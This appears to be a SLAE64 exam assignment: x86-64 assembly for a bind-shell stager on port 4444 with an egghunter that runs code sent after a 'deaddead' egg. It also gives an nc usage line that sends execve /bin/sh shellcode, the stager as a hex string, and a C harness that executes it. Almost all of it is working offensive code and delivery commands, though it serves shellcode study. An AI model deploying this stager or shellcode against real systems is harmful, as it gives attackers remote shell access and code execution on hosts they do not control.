;Exam Assignment 3
;implementation of egghunter
;Default egg = "deaddead"                       ;
;If connected the stager check of egg , if present execute the code   ;
;You can send a maximum of 255 bytes (egg + code)                     ;
;if no egg , shellcode exit                                           ;
;Christophe G SLAE64 - 1337                                           ;



global _start

     jmp short _start
    _start_code :
        call rsi

_start:


    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41

    xor rdx , rdx
    push rdx        ; null into the stack
    push byte 0x29 ; syscall number 41
    pop rax
    push byte 0x2  ; AF_INET
    pop rdi
    push byte 0x1  ; SOCK_STREAM
    pop rsi
    syscall

    ; copy socket descriptor to rdi for future use
    xchg rax , rdi


    ; server.sin_family = AF_INET
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = INADDR_ANY
    ; bzero(&server.sin_zero, 8)

     xor rax, rax

     push rax  ; bzero(&server.sin_zero, 8)


     mov rbx , 0xffffffffa3eefffd    ; move ip address , port 4444 , AF_INET (02) in one instruction (noted to remove null of ip address and AF_INET value)


     not rbx
     push rbx
     push rsp  ; save rsp value into the stack , needed for rsi later


    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; syscall number 49


    push byte 0x31 ; (49)
    pop rax
    pop rsi        ; retrieve value of rsp  pushed into the stack before
    push byte 0x10  ; (16 bytes) sockaddr_len
    pop rdx
    syscall


    ; listen(sock, MAX_CLIENTS)
    ; syscall number 50

    push byte 0x32 ; (50)
    pop rax
    push byte 0x2   ;MAX_CLIENTS

    pop rsi
    syscall


    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; syscall number 43


    push byte 0x2b   ; Accept syscall
    pop rax
    sub rsp, 0x10
    push rsp
    pop rsi       ;(struct sockaddr *)&client

    push byte 0x10
    push rsp
    pop rdx    ; &sockaddr_len

    syscall

    ; store the client socket description
    mov r9, rax

    ; close parent

    push byte 0x3
    pop rax
    syscall





      xchg rdi , r9   ; restore client socket description to rdi
      xor rsi , rsi

  dup2:
      push byte 0x21
      pop rax       ; duplicate sockets  dup2 (new, old) in this case (stdin , stdout , stderr); three times loop
      syscall
    inc rsi
    cmp rsi , 0x3  ; go in the next couple of instruction if equals

 loopne dup2

       xor rsi , rsi
       mul rsi
       xor rdi , rdi
       sub spl , 0xff
       mov rsi , rsp
       mov dl , 0xff
       syscall

      Inc_rsi:
         cmp dil , 0xff
         jz Exit
         inc rsi
         inc rdi



      cmp [rsi - 4] , dword 0x64616564                   ; egghunter
      jnz Inc_rsi
      cmp [rsi - 8] , dword 0x64616564
      jnz Inc_rsi
      jz _start_code

      Exit:
         push byte 0x3c
         pop rax
         syscall




------------------------------------------------------------------------------------------------------------------------------------------------

Usage :

    Execve Shellcode

#(echo -ne "\x68\x85\x11\x47\x02\x64\x65\x61\x64\x64\x65\x61\x64\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43" ; cat) | nc localhost 4444


"x68\x85\x11\x47\x02" -->> dumm bytes

"\x64\x65\x61\x64\x64\x65\x61\x64" -->> egg (deaddead)

"\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10"
"\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff"  -->> shellcode Execve JCP
"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42"
"\x42\x43\x43\x43\x43\x43\x43\x43\x43"

---------------------------------------------------------------------------------------------------------------------------------------------------


Shellcode :

#include <stdio.h>
#include <string.h>

unsigned char stager[] = \
"\xeb\x02\xff\xd6\x48\x31\xd2\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\x31\xc0\x50\x48\xc7\xc3\xfd\xff\xee\xa3\x48\xf7\xd3\x53\x54\x6a\x31\x58\x5e\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\x6a\x2b\x58\x48\x83\xec\x10\x54\x5e\x6a\x10\x54\x5a\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x21\x58\x0f\x05\x48\xff\xc6\x48\x83\xfe\x03\xe0\xf2\x48\x31\xf6\x48\xf7\xe6\x48\x31\xff\x40\x80\xec\xff\x48\x89\xe6\xb2\xff\x0f\x05\x40\x80\xff\xff\x74\x1e\x48\xff\xc6\x48\xff\xc7\x81\x7e\xfc\x64\x65\x61\x64\x75\xeb\x81\x7e\xf8\x64\x65\x61\x64\x75\xe2\x0f\x84\x6a\xff\xff\xff\x6a\x3c\x58\x0f\x05";

int main()

{

    printf("Stager Length:  %d\n", (int)strlen(stager));


    (*(void  (*)()) stager)();





}